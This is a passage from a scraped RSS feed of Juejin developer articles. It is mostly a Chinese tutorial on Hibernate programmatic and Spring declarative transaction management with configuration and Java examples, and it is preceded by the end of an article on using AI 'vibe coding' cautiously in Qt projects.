<p>在QT开发中引入Vibe Coding时，最为谨慎的做法是将其应用于<strong>非核心模块</strong>或<strong>一次性工具</strong>的开发中，而对于那些需要长期维护、涉及关键业务逻辑或对性能有严格要求的模块，则应保持传统的开发方式。</p>
<h2 data-id="heading-4">05 混合开发的最佳实践</h2>
<p>如何在QT开发中合理利用Vibe Coding？一些实践者总结出了“有意识的Vibe Coding”最佳实践。</p>
<p>首先，当涉及UI开发时，可以采用<strong>QML作为主要界面技术</strong>，这比传统的Widget更适合与Vibe Coding结合。</p>
<p>因为QML的声明式语法相对简单，AI更容易生成有效的代码，而设计师也可以用Figma等工具直接输出界面原型。</p>
<p>其次，在代码生成过程中，应当采用<strong>分层应用策略</strong>。根据代码的重要性和风险级别，采用不同程度的人工审查和测试。</p>
<p>核心功能如业务逻辑处理、数据模型和关键算法应采用传统开发，而辅助性UI组件、工具函数等则可以更多地依赖AI生成。</p>
<p>一个有效的策略是将Vibe Coding作为<strong>快速迭代的工具</strong>而非最终解决方案。这意味着接受AI的初步生成结果，快速测试，通过反馈迭代优化，而不是追求一次性完美。</p>
<p>一位独立开发者分享了他的经验：“我每次只让AI实现一个小功能，确保功能正常、测试通过，再进行下一个功能的开发。如果当前的小功能AI改错了，可以通过git直接回滚到上一个稳定版本。”</p>
<h2 data-id="heading-5">06 当桌面应用遇上Web技术</h2>
<p>现代GUI开发领域，本地GUI框架与Web技术的融合已成为趋势，而QT与Web的结合为开发者提供了前所未有的灵活性。在这种情况下，Vibe Coding可能找到更有前景的应用场景。</p>
<p>通过QCefView等项目，开发者可以将最新的Web技术嵌入到QT应用中，同时保留本地应用的性能和系统集成能力。</p>
<p>这种架构为Vibe Coding提供了独特的可能性：可以利用AI快速生成Web前端组件，同时用传统的QT C++代码处理核心业务逻辑和系统级功能。</p>
<p>例如，在智能家居控制面板等项目中，可以利用QCefView将实时设备状态展示（使用Web图表）与本地硬件接口控制（使用QT串口通信）结合起来。</p>
<p>这种混合架构允许开发团队根据不同部分的特点选择最合适的技术和开发方式：Web部分可以利用Vibe Coding快速迭代，而核心的本地功能则保持传统的严谨开发流程。</p>
<hr/>
<p>技术顾问圈子里流传着这样一个观察：当Vibe Coding已经普及，随之而来的却是严重的“开发断层”。</p>
<p>“当开发门槛好像消失了，但<strong>系统崩溃的风险却变高了</strong>。”这是许多技术团队负责人和企业的共同感受。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（53）Hibernate的事务管理如何实现？]]></title>    <link>https://juejin.cn/post/7597270795211948072</link>    <guid>https://juejin.cn/post/7597270795211948072</guid>    <pubDate>2026-01-20T11:55:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597270795211948072" data-draft-id="7597266967138140194" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（53）Hibernate的事务管理如何实现？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-20T11:55:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（53）Hibernate的事务管理如何实现？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T11:55:03.000Z" title="Tue Jan 20 2026 11:55:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Hibernate的事务管理是确保一组数据库操作要么全部成功，要么全部失败（回滚）的机制。它在确保数据一致性和完整性方面起着关键作用。Hibernate支持多种事务管理方式，如程序化事务管理和声明式事务管理。以下是详细的事务管理实现和代码示例。</p>
<h3 data-id="heading-0">1. 程序化事务管理</h3>
<p>程序化事务管理是指在代码中显式地控制事务的开始、提交和回滚。适用于简单应用或需要精确控制事务边界的场景。</p>
<h4 data-id="heading-1">配置Hibernate</h4>
<p>在<code>hibernate.cfg.xml</code>中配置Hibernate：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- 数据库连接配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate 属性配置 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 映射类 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-2">实体类定义</h4>
<p>以下是一个简单的实体类<code>Product</code>的定义：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-comment">// Getters and Setters</span>
}
</code></pre>
<h4 data-id="heading-3">程序化事务管理的实现</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateTransactionExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 创建一个产品</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
        product.setName(<span class="hljs-string">"Laptop"</span>);
        product.setPrice(<span class="hljs-number">1200.00</span>);

        <span class="hljs-comment">// 保存产品</span>
        saveProduct(product);
        
        <span class="hljs-comment">// 更新产品</span>
        product.setPrice(<span class="hljs-number">1300.00</span>);
        updateProduct(product);
        
        <span class="hljs-comment">// 删除产品</span>
        deleteProduct(product.getId());

        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveProduct</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            session.save(product);
            transaction.commit();
            System.out.println(<span class="hljs-string">"Product saved successfully"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateProduct</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            session.update(product);
            transaction.commit();
            System.out.println(<span class="hljs-string">"Product updated successfully"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteProduct</span><span class="hljs-params">(Long productId)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> session.get(Product.class, productId);
            <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
                session.delete(product);
                transaction.commit();
                System.out.println(<span class="hljs-string">"Product deleted successfully"</span>);
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-4">2. 声明式事务管理</h3>
<p>声明式事务管理在Spring框架中很常见，通过注解或XML配置来管理事务。它不需要显式的事务管理代码，更简洁且易于维护。</p>
<h4 data-id="heading-5">Spring配置</h4>
<p>在Spring的配置文件<code>applicationContext.xml</code>中配置事务管理：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.springframework.org/schema/beans"</span>
       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>
       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">"http://www.springframework.org/schema/context"</span>
       <span class="hljs-attr">xmlns:tx</span>=<span class="hljs-string">"http://www.springframework.org/schema/tx"</span>
       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">"http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/context
        http://www.springframework.org/schema/context/spring-context.xsd
        http://www.springframework.org/schema/tx
        http://www.springframework.org/schema/tx/spring-tx.xsd"</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Hibernate SessionFactory --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"sessionFactory"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"org.springframework.orm.hibernate5.LocalSessionFactoryBean"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"dataSource"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"dataSource"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"packagesToScan"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"com.example.domain"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernateProperties"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">props</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">props</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- DataSource --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"dataSource"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"org.springframework.jdbc.datasource.DriverManagerDataSource"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"driverClassName"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"com.mysql.cj.jdbc.Driver"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"url"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"jdbc:mysql://localhost:3306/your_database"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"your_username"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"your_password"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Transaction Manager --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"transactionManager"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"org.springframework.orm.hibernate5.HibernateTransactionManager"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sessionFactory"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"sessionFactory"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Enable annotation-driven transaction management --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">tx:annotation-driven</span>/&gt;</span>

    <span class="hljs-comment">&lt;!-- Service layer beans --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"productService"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.service.ProductService"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span>
</code></pre>
<h4 data-id="heading-6">实体类定义</h4>
<p>与程序化事务管理中的实体类定义相同，这里不再重复。</p>
<h4 data-id="heading-7">服务层定义</h4>
<p>在服务层中使用<code>@Transactional</code>注解来管理事务。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Session;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> SessionFactory sessionFactory;

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveProduct</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.getCurrentSession();
        session.save(product);
        System.out.println(<span class="hljs-string">"Product saved successfully"</span>);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateProduct</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.getCurrentSession();
        session.update(product);
        System.out.println(<span class="hljs-string">"Product updated successfully"</span>);
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteProduct</span><span class="hljs-params">(Long productId)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.getCurrentSession();
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> session.get(Product.class, productId);
        <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
            session.delete(product);
            System.out.println(<span class="hljs-string">"Product deleted successfully"</span>);
        }
    }
}
</code></pre>
<h4 data-id="heading-8">使用服务层</h4>
<p>在客户端代码中使用服务层来进行数据库操作，事务管理由Spring自动处理：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;
<span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringHibernateTransactionExample</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">"applicationContext.xml"</span>);
        <span class="hljs-type">ProductService</span> <span class="hljs-variable">productService</span> <span class="hljs-operator">=</span> context.getBean(ProductService.class);

        <span class="hljs-comment">// 创建一个产品</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
        product.setName(<span class="hljs-string">"Laptop"</span>);
        product.setPrice(<span class="hljs-number">1200.00</span>);

        <span class="hljs-comment">// 保存产品</span>
        productService.saveProduct(product);

        <span class="hljs-comment">// 更新产品</span>
        product.setPrice(<span class="hljs-number">1300.00</span>);
        productService.updateProduct(product);

        <span class="hljs-comment">// 删除产品</span>
        productService.deleteProduct(product.getId());
    }
}
</code></pre>
<h3 data-id="heading-9">总结</h3>
<ol>
<li><strong>程序化事务管理</strong>：在代码中显式地控制事务的开始、提交和回滚，适用于简单应用或需要精确控制事务边界的场景。</li>
<li><strong>声明式事务管理</strong>：通过Spring框架的注解或XML配置来管理事务，不需要显式的事务管理代码，更简洁且易于维护。</li>
</ol>
<p>通过这些方法，可以有效地管理Hibernate应用程序中的事务，确保数据的一致性和完整性。希望这些详细的解释和代码示例能帮助您更好地理解和应用Hibernate的事务管理技术。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（54）Hibernate中的批量更新如何实现？]]></title>    <link>https://juejin.cn/post/7597283981184860212</link>    <guid>https://juejin.cn/post/7597283981184860212</guid>    <pubDate>2026-01-20T11:55:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597283981184860212" data-draft-id="7597270795211980840" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（54）Hibernate中的批量更新如何实现？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-20T11:55:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" 